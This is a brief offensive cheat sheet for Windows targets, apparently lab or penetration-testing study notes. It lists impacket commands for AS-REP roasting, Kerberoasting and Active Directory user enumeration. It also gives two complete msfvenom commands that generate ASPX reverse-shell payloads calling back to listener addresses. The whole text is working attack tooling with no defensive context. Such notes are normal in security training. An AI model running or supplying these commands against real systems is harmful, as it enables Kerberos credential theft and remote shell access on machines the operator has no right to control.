#windows 

`impacket-GetNPUsers ` to get the krb ticket for accounts where pre auth is disabled for AS-REP roasting

`impacket-GetUserSPNs` 

`impacket-GetADUsers` 


`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.166 LPORT=4242 -f aspx > reverse_shell.aspx`

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.219 LPORT=80 --platform Windows -a x64 -f aspx -o shell.aspx|